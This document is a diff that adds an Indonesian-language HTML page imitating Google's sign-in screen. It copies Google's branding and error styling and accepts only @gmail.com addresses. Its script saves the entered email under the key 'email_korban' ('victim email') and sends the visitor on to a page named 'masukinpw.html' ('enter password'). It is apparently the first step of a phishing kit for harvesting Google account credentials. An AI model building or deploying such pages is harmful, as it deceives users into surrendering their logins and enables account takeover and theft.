@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Login - Google</title>
+<style>
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: Arial, Helvetica, sans-serif; }
+    body { background-color: #000000; color: #e3e3e3; display: flex; flex-direction: column; min-height: 100vh; padding: 15px 24px 24px 24px; }
+    .container { width: 100%; display: flex; flex-direction: column; flex: 1; }
+    .logo-text { text-align: center; font-size: 32px; font-weight: 500; color: #ffffff; letter-spacing: -0.5px; margin-bottom: 10px; }
+    h1 { font-size: 30px; font-weight: 400; text-align: center; margin-bottom: 15px; color: #ffffff; }
+    .description { font-size: 18px; line-height: 1.4; text-align: center; margin-bottom: 24px; color: #a0a0a0; padding: 0 10px; }
+    .description span.link { color: #8ab4f8; cursor: pointer; }
+    
+    .input-group { margin-bottom: 16px; position: relative; }
+    
+    /* STYLE ERROR GOOGLE ASLI */
+    .error-msg {
+        display: none;
+        color: #f28b82;
+        font-size: 13px;
+        margin-top: 6px;
+        padding-left: 2px;
+        align-items: center;
+        gap: 6px;
+    }
+    .error-msg.show { display: flex; }
+    .error-msg svg { width: 14px; height: 14px; fill: #f28b82; flex-shrink: 0; }
+
+    .input-field { 
+        width: 100%; 
+        background-color: transparent; 
+        border: 1px solid #5f6368; 
+        border-radius: 4px; 
+        padding: 16px; 
+        font-size: 18px; 
+        color: #e3e3e3; 
+        outline: none; 
+        height: 56px; 
+        transition: border-color 0.2s;
+    }
+    .input-field::placeholder { color: #9aa0a6; }
+    .input-field.input-error { border: 1.5px solid #f28b82; }
+
+    .forgot-link { display: block; color: #8ab4f8; font-size: 16px; font-weight: 500; text-decoration: none; margin-bottom: 40px; margin-left: 2px; }
+    .create-account { display: block; color: #8ab4f8; font-size: 16px; font-weight: 500; text-decoration: none; margin-bottom: auto; margin-left: 2px; }
+    .button-container { display: flex; justify-content: flex-end; margin-top: 40px; padding-bottom: 20px; }
+    .btn-next { background-color: #8ab4f8; color: #040d21; border: none; border-radius: 4px; padding: 12px 24px; font-size: 16px; font-weight: 500; cursor: pointer; min-width: 100px; }
+</style>
+</head>
+<body>
+
+<div class="container">
+    <div class="logo-text">Google</div>
+    <h1>Login</h1>
+    <p class="description">
+        Gunakan Akun Google Anda. Akun akan ditambahkan ke perangkat ini dan <br>tersedia untuk aplikasi Google lainnya.<br>
+        <span class="link">Pelajari lebih lanjut cara menggunakan akun Anda </span>
+    </p>
+
+    <div class="input-group">
+        <input type="email" id="emailInput" class="input-field" placeholder="Email atau nomor telepon">
+        
+        <!-- NOTIFIKASI ERROR -->
+        <div class="error-msg" id="emailError">
+            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+            <span id="emailErrorText">Harus diakhiri dengan @gmail.com</span>
+        </div>
+    </div>
+
+    <a href="#" class="forgot-link">Lupa email?</a>
+    <a href="#" class="create-account">Buat akun</a>
+
+    <div class="button-container">
+        <button class="btn-next" onclick="lanjutEmail()">Berikutnya</button>
+    </div>
+</div>
+
+<script>
+    function lanjutEmail() {
+        var email = document.getElementById('emailInput').value.trim().toLowerCase();
+        var input = document.getElementById('emailInput');
+        var errorDiv = document.getElementById('emailError');
+        var errorText = document.getElementById('emailErrorText');
+
+        // Reset error
+        input.classList.remove('input-error');
+        errorDiv.classList.remove('show');
+
+        if(email === "") {
+            errorText.innerText = "Masukkan email atau nomor telepon";
+            input.classList.add('input-error');
+            errorDiv.classList.add('show');
+            return;
+        }
+
+        // Validasi Harus @gmail.com
+        if(!email.endsWith("@gmail.com")) {
+            errorText.innerText = "Email harus diakhiri dengan @gmail.com";
+            input.classList.add('input-error');
+            errorDiv.classList.add('show');
+            return;
+        }
+
+        // Simpan email ke sessionStorage
+        sessionStorage.setItem('email_korban', email);
+        
+        // Lanjut ke halaman password
+        window.location.href = "masukinpw.html";
+    }
+
+    // Enter key support
+    document.getElementById('emailInput').addEventListener('keypress', function(e) {
+        if (e.key === 'Enter') { lanjutEmail(); }
+    });
+</script>
+</body>
+</html>
